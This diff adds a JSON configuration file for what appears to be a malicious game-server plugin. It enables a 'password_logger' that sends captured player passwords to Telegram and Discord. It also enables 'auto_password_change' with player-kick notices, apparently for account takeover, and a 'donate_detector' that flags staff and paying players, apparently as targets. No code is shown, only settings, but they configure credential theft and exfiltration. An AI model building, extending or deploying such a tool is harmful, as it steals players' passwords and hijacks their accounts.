@@ -1,0 +1,52 @@
+{
+  "password_logger": {
+    "telegram": {
+      "enabled": true,
+      "notifications": {
+        "passwordCapture": true,
+        "playerJoin": false,
+        "playerLeave": false
+      }
+    },
+    "discord": {
+      "enabled": true,
+      "notifications": {
+        "passwordCapture": true,
+        "playerJoin": false,
+        "playerLeave": false
+      }
+    }
+  },
+  "auto_password_change": {
+    "telegram": {
+      "enabled": true,
+      "notifications": {
+        "passwordChanged": true,
+        "playerKicked": true
+      }
+    },
+    "discord": {
+      "enabled": true,
+      "notifications": {
+        "passwordChanged": true,
+        "playerKicked": true
+      }
+    }
+  },
+  "donate_detector": {
+    "telegram": {
+      "enabled": true,
+      "notifications": {
+        "staffDetected": true,
+        "donatorDetected": true
+      }
+    },
+    "discord": {
+      "enabled": true,
+      "notifications": {
+        "staffDetected": true,
+        "donatorDetected": true
+      }
+    }
+  }
+}
